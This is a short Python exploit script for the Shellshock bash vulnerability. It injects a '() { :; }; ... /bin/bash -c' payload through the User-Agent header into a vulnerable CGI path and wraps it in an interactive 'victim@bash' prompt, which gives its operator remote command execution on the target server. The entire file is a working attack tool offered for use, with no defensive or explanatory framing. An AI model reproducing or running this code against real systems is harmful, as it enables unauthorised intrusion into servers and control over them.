#!/bin/python3
# Title: ShellShock Remote Shell
# Author: EmanuelFirmino
# Tested on: Kali Linux / Parrot OS

import requests
import sys

def shell(url):
	print('[*] Opening a remote shell... [*]\n')
	print('[*] Type "exit" to quit [*]\n')
	while True:
		cmd = input('victim@bash:$ ')
		if cmd == 'exit': sys.exit()
		print(exploit(url, cmd))


def interface():
	xc = 0b11
	print('[*] ShellShock Exploit [*]\n')
	print('[1] Input path to vulnerable CGI file;')
	print('[2] exit.\n')

	while xc > 0b10:
		xc = int(input('[*] Choose option: '))
		if xc > 0b10:
			print('[*] Invalid Option! [*]')
	print('\n')
	if xc == 0b1:
		vuln_path = input('[*] Input the path to vulnerable CGI file: ')
		url = sys.argv[1]+vuln_path
		shell(url)
	else:
		sys.exit()
	

def exploit(url, comando):
	header = 'User-Agent'
	payload = "() { :; }; echo; echo; /bin/bash -c '"
	reqest = requests.get(url, headers = {header: payload+comando+"'"})
	return reqest.text

def main():
	if len(sys.argv) < 0b10:
		print(f'[*] Usage: ./{sys.argv[0b0]} http://example.com [*]')
		sys.exit()
	try:
		interface()
	except KeyboardInterrupt:
		print('\n[*] Exiting... [*]')
		sys.exit()		
	

if __name__ == '__main__':
	main()
